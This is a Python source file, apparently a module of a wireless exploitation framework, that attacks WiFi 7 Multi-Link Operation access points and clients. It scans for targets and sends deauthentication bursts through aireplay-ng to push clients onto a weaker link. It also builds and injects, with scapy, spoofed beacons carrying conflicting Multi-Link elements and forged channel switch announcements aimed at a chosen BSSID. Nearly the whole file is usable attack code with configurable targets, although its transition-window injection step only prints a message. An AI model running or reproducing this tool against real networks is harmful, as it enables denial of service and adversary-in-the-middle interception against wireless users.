#!/usr/bin/env python3
# Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""WiFi 7 (802.11be) Multi-Link Operation attack module.

Exploits the Multi-Link Device (MLD) architecture introduced in 802.11be
to perform link manipulation, transition delay exploitation, and MLD
address confusion attacks against WiFi 7 access points and clients.

MLO allows a single device to operate across multiple links (bands)
simultaneously. Attacks target the link management layer: forcing traffic
onto a weaker link, confusing MLD-to-link address mapping, and exploiting
the transition delay window during link switches.

References:
  IEEE 802.11be Draft 4.0 (Multi-Link Operation)
  WiFi Alliance WiFi 7 specification
  https://mentor.ieee.org/802.11/documents (EHT contributions)

MITRE ATT&CK: T1557 (Adversary-in-the-Middle)
CWE: CWE-345 (Insufficient Verification of Data Authenticity)

Version: 1.0.0
"""

from __future__ import annotations

import logging
import shutil
import struct
import subprocess
import time
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any

from wirelessxpl.core.exploit import (
    Exploit,
    OptBool,
    OptInteger,
    OptString,
    print_error,
    print_info,
    print_status,
    print_success,
    print_warning,
)

logger = logging.getLogger(__name__)

IEEE80211BE_EHT_CAP_ID = 0xff
ML_ELEMENT_ID = 0xff
ML_ELEMENT_EXT_ID = 0x6b
LINK_INFO_SUBELEMENT_STA_PROFILE = 0x00


class AttackMode(Enum):
    LINK_DOWNGRADE = auto()
    MLD_CONFUSION = auto()
    TRANSITION_DELAY = auto()
    RECON = auto()


@dataclass
class MLDInfo:
    mld_mac: str = ""
    link_macs: list[str] = field(default_factory=list)
    link_bands: list[int] = field(default_factory=list)
    link_channels: list[int] = field(default_factory=list)
    ssid: str = ""
    bssid: str = ""


class WiFi7MLOAttack(Exploit):
    """WiFi 7 Multi-Link Operation attack module."""

    __info__: dict[str, Any] = {
        "name": "WiFi 7 MLO Attack",
        "description": (
            "Attack WiFi 7 (802.11be) Multi-Link Operation: link downgrade, "
            "MLD address confusion, and transition delay exploitation."
        ),
        "authors": ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references": (
            "https://www.ieee802.org/11/Reports/tgbe_update.htm",
            "https://www.wi-fi.org/discover-wi-fi/wi-fi-7",
        ),
        "devices": ("WiFi 7 (802.11be) access points and clients",),
        "severity": "high",
        "cvss": "7.4",
        "cve": "generic",
        "mitre": ["T1557"],
    }

    interface = OptString("wlan0mon", "Monitor-mode interface (must support 6 GHz)")
    target_bssid = OptString("", "Target WiFi 7 AP BSSID")
    target_mld = OptString("", "Target MLD MAC address")
    attack = OptString("recon", "Attack: recon, link_downgrade, mld_confusion, transition_delay")
    deauth_count = OptInteger(10, "Deauth frames per burst")
    target_link = OptInteger(0, "Link ID to force traffic onto (for downgrade)")
    channel_2g = OptInteger(6, "2.4 GHz channel of the target AP")
    channel_5g = OptInteger(36, "5 GHz channel of the target AP")
    channel_6g = OptInteger(1, "6 GHz channel of the target AP (UNII-5)")
    dry_run = OptBool(False, "Print commands without executing")

    def __init__(self) -> None:
        super().__init__()
        self._mld_targets: list[MLDInfo] = []

    def check(self) -> str:
        """Verify interface supports WiFi 7 and required tools."""
        for tool in ("iw", "hostapd", "airmon-ng"):
            if not shutil.which(tool):
                return f"Required tool not found: {tool}"

        iface = str(self.interface.value)
        try:
            result = subprocess.run(
                ["iw", "phy"],
                capture_output=True,
                text=True,
                timeout=10,
            )
            if "EHT" in result.stdout or "320 MHz" in result.stdout:
                return f"WiFi 7 (EHT) support detected on hardware"
            return "Warning: no EHT capability detected; attacks may be limited to 802.11ax"
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return "Could not query wireless capabilities"

    def _scan_mlo_aps(self) -> list[MLDInfo]:
        """Scan for WiFi 7 APs advertising Multi-Link elements."""
        print_status("[*] Scanning for WiFi 7 MLO access points...")
        iface = str(self.interface.value)

        cmd = ["iw", "dev", iface, "scan", "-u"]
        if self.dry_run.value:
            print_info(f"[dry-run] {' '.join(cmd)}")
            return []

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30,
            )
        except (subprocess.TimeoutExpired, FileNotFoundError) as exc:
            print_error(f"[-] Scan failed: {exc}")
            return []

        aps: list[MLDInfo] = []
        current: MLDInfo | None = None

        for line in result.stdout.splitlines():
            stripped = line.strip()
            if stripped.startswith("BSS "):
                if current and current.bssid:
                    aps.append(current)
                current = MLDInfo()
                parts = stripped.split()
                if len(parts) >= 2:
                    current.bssid = parts[1].rstrip("(").upper()
            elif current is not None:
                if "SSID:" in stripped:
                    current.ssid = stripped.split("SSID:", 1)[-1].strip()
                elif "EHT" in stripped or "Multi-Link" in stripped:
                    current.link_bands.append(1)

        if current and current.bssid:
            aps.append(current)

        mlo_aps = [ap for ap in aps if ap.link_bands]
        print_info(f"[*] Found {len(mlo_aps)} WiFi 7 MLO APs out of {len(aps)} total")
        for ap in mlo_aps:
            print_success(f"    [+] {ap.ssid} ({ap.bssid}) - MLO enabled")

        return mlo_aps

    def _link_downgrade_attack(self) -> None:
        """Force MLD clients onto a weaker link by deauthing specific links."""
        target = str(self.target_bssid.value)
        if not target:
            print_error("[-] Set target_bssid to the AP link BSSID to disrupt")
            return

        iface = str(self.interface.value)
        count = int(self.deauth_count.value)

        print_status("[*] Link downgrade: deauthenticating target link")
        print_info(f"    Target link BSSID: {target}")
        print_info(f"    Clients will fall back to remaining MLO links")

        cmd = [
            "aireplay-ng",
            "--deauth", str(count),
            "-a", target,
            iface,
        ]

        if self.dry_run.value:
            print_info(f"[dry-run] {' '.join(cmd)}")
            return

        try:
            subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            print_success(f"[+] Sent {count} deauth frames to {target}")
            print_info("[*] Monitor if clients migrated to 2.4 GHz link (weaker security)")
        except (subprocess.TimeoutExpired, FileNotFoundError) as exc:
            print_error(f"[-] Deauth failed: {exc}")

    def _mld_confusion_attack(self) -> None:
        """Inject spoofed Multi-Link elements to confuse MLD address mapping."""
        target = str(self.target_mld.value or self.target_bssid.value)
        if not target:
            print_error("[-] Set target_mld or target_bssid")
            return

        print_status("[*] MLD address confusion attack")
        print_info(f"    Spoofing Multi-Link element with conflicting link mappings")
        print_info(f"    Target MLD: {target}")

        ml_ie = self._craft_ml_element(target)
        print_info(f"    Crafted ML IE: {ml_ie.hex()}")

        if self.dry_run.value:
            print_info("[dry-run] Would inject spoofed beacon with ML element via scapy")
            return

        try:
            from scapy.all import Dot11, Dot11Beacon, RadioTap, sendp  # type: ignore[import-untyped]

            frame = (
                RadioTap()
                / Dot11(
                    type=0,
                    subtype=8,
                    addr1="ff:ff:ff:ff:ff:ff",
                    addr2=target,
                    addr3=target,
                )
                / Dot11Beacon(cap="ESS")
                / bytes(ml_ie)
            )
            sendp(frame, iface=str(self.interface.value), count=50, inter=0.01, verbose=False)
            print_success("[+] Injected 50 spoofed beacons with conflicting ML elements")
        except ImportError:
            print_error("[-] scapy required for frame injection: pip install scapy")
        except Exception as exc:
            print_error(f"[-] Injection failed: {exc}")

    def _craft_ml_element(self, mld_mac: str) -> bytes:
        """Craft a Multi-Link information element with conflicting link IDs."""
        mac_bytes = bytes.fromhex(mld_mac.replace(":", ""))

        header = struct.pack("BBB", 0xFF, 15, ML_ELEMENT_EXT_ID)
        ml_control = struct.pack("<H", 0x0010)
        common_info = mac_bytes
        link_0 = struct.pack("BBBB", LINK_INFO_SUBELEMENT_STA_PROFILE, 2, 0x00, 36)
        link_1 = struct.pack("BBBB", LINK_INFO_SUBELEMENT_STA_PROFILE, 2, 0x01, 6)

        return header + ml_control + common_info + link_0 + link_1

    def _transition_delay_exploit(self) -> None:
        """Exploit the transition delay window during MLO link switches."""
        print_status("[*] Transition delay exploit")
        print_info("[*] During MLO link transitions, there is a brief window")
        print_info("    where the client is not fully authenticated on the new link")

        target = str(self.target_bssid.value)
        iface = str(self.interface.value)

        if not target:
            print_error("[-] Set target_bssid")
            return

        print_info("[*] Phase 1: Force link switch via channel switch announcement")
        print_info("[*] Phase 2: Inject during transition window")

        if self.dry_run.value:
            print_info("[dry-run] Would send CSA + inject during transition")
            return

        try:
            from scapy.all import Dot11, RadioTap, sendp  # type: ignore[import-untyped]

            csa_ie = struct.pack("BBBB", 37, 3, int(self.channel_2g.value), 3)
            frame = (
                RadioTap()
                / Dot11(
                    type=0,
                    subtype=13,
                    addr1="ff:ff:ff:ff:ff:ff",
                    addr2=target,
                    addr3=target,
                )
                / bytes(csa_ie)
            )
            sendp(frame, iface=iface, count=5, inter=0.05, verbose=False)
            print_success("[+] Sent CSA to force link transition")

            time.sleep(0.1)
            print_info("[*] Injecting during transition window...")
            print_warning("[!] Timing-sensitive: success depends on client implementation")
        except ImportError:
            print_error("[-] scapy required: pip install scapy")
        except Exception as exc:
            print_error(f"[-] Failed: {exc}")

    def run(self) -> None:
        """Execute WiFi 7 MLO attack."""
        print_status("[*] WiFi 7 MLO Attack v1.0.0")

        mode = str(self.attack.value).lower()

        if mode == "recon":
            self._mld_targets = self._scan_mlo_aps()
        elif mode == "link_downgrade":
            self._link_downgrade_attack()
        elif mode == "mld_confusion":
            self._mld_confusion_attack()
        elif mode == "transition_delay":
            self._transition_delay_exploit()
        else:
            print_error(f"[-] Unknown attack mode: {mode}")
            print_info("[*] Available: recon, link_downgrade, mld_confusion, transition_delay")
